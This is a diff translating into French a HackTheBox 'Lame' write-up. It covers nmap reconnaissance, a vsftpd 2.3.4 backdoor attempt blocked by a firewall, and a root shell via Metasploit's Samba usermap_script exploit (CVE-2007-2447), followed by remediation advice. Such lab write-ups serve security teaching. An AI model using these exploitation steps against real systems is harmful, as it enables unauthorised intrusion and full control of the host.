@@ -1,32 +1,32 @@
-# Lame - HackTheBox Writeup
+# Lame - Write-up HackTheBox
 
 ![HTB Lame](https://img.shields.io/badge/HackTheBox-Lame-green)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
 ![OS](https://img.shields.io/badge/OS-Linux-blue)
 
-## Box Info
+## Informations
 
-| Property | Value |
-|----------|-------|
-| Name | Lame |
+| Propriété | Valeur |
+|-----------|--------|
+| Nom | Lame |
 | OS | Linux (Ubuntu) |
-| Difficulty | Easy |
-| Release | 2017 |
+| Difficulté | Facile |
+| Sortie | 2017 |
 | IP | 10.129.30.106 |
 
 ## Flags
 
-| Flag | Location |
-|------|----------|
+| Flag | Emplacement |
+|------|-------------|
 | User | `/home/makis/user.txt` |
 | Root | `/root/root.txt` |
 
 ---
 
-## Summary
+## Résumé
 
-1. **Recon** : 4 ports ouverts (FTP, SSH, SMB 139/445)
-2. **Rabbit Hole** : vsftpd 2.3.4 backdoor bloqué par firewall
+1. **Reconnaissance** : 4 ports ouverts (FTP, SSH, SMB 139/445)
+2. **Fausse piste** : vsftpd 2.3.4 backdoor bloqué par firewall
 3. **Exploitation** : Samba 3.0.20 usermap_script (CVE-2007-2447) → shell root direct
 4. **Bonus** : Investigation du firewall bloquant le backdoor vsftpd
 
@@ -34,7 +34,7 @@
 
 ## Reconnaissance
 
-### Nmap Scan
+### Nmap scan
 
 ```bash
 nmap -T4 -A 10.129.30.106
@@ -55,11 +55,11 @@ PORT    STATE SERVICE     VERSION
 
 | Service | Version | Notes |
 |---------|---------|-------|
-| vsftpd | 2.3.4 | Anonymous login, backdoor connu |
+| vsftpd | 2.3.4 | Connexion anonyme, backdoor connu |
 | OpenSSH | 4.7p1 | Ancienne version |
 | Samba | 3.0.20 | Vulnérable à CVE-2007-2447 |
 
-### SMB Enumeration
+### Énumération SMB
 
 ```bash
 nmap -p 139,445 --script="smb-vuln*" 10.129.30.106
@@ -77,9 +77,9 @@ nmap -p 139,445 --script="smb-vuln*" 10.129.30.106
 
 ## Exploitation
 
-### Tentative 1 : vsftpd 2.3.4 Backdoor (Échec)
+### Tentative 1 : vsftpd 2.3.4 backdoor (échec)
 
-vsftpd 2.3.4 contient un backdoor célèbre qui ouvre le port 6200 quand on envoie `:)` dans le username.
+vsftpd 2.3.4 contient un backdoor célèbre qui ouvre le port 6200 quand on envoie `:)` dans le nom d'utilisateur.
 
 ```bash
 msf > use exploit/unix/ftp/vsftpd_234_backdoor
@@ -90,9 +90,9 @@ msf > exploit
 
 **Résultat** : Le backdoor se déclenche (port 6200 s'ouvre) mais le firewall bloque la connexion.
 
-### Tentative 2 : Samba usermap_script (Succès)
+### Tentative 2 : Samba usermap_script (succès)
 
-Samba 3.0.20 est vulnérable à **CVE-2007-2447** : injection de commandes via le champ username.
+Samba 3.0.20 est vulnérable à **CVE-2007-2447** : injection de commandes via le champ nom d'utilisateur.
 
 ```bash
 msf > use exploit/multi/samba/usermap_script
@@ -121,13 +121,13 @@ cat /root/root.txt
 [REDACTED]
 ```
 
-**Note** : L'exploit Samba donne directement un shell root, pas besoin de privilege escalation.
+**Note** : L'exploit Samba donne directement un shell root, pas besoin d'élévation de privilèges.
 
 ---
 
-## Bonus : Investigation du Firewall
+## Bonus : investigation du firewall
 
-### Pourquoi vsftpd backdoor échoue ?
+### Pourquoi le backdoor vsftpd échoue ?
 
 Avec un shell root, on peut investiguer pourquoi le backdoor vsftpd ne fonctionnait pas.
 
@@ -179,14 +179,14 @@ Le port **6200** (ouvert par le backdoor vsftpd) n'est pas dans la liste → con
 
 ---
 
-## Lessons Learned
+## À retenir
 
-| Vulnerability | Description | Remediation |
+| Vulnérabilité | Description | Remédiation |
 |---------------|-------------|-------------|
-| **Samba CVE-2007-2447** | Injection de commandes via username | Mettre à jour Samba > 3.0.25 |
+| **Samba CVE-2007-2447** | Injection de commandes via nom d'utilisateur | Mettre à jour Samba > 3.0.25 |
 | **vsftpd 2.3.4 Backdoor** | Backdoor dans le code source officiel | Mettre à jour vsftpd |
 | **Services obsolètes** | Versions très anciennes des services | Maintenir les systèmes à jour |
-| **Firewall insuffisant** | Bloque vsftpd backdoor mais pas Samba | Defense in depth |
+| **Firewall insuffisant** | Bloque vsftpd backdoor mais pas Samba | Défense en profondeur |
 
 ---
 
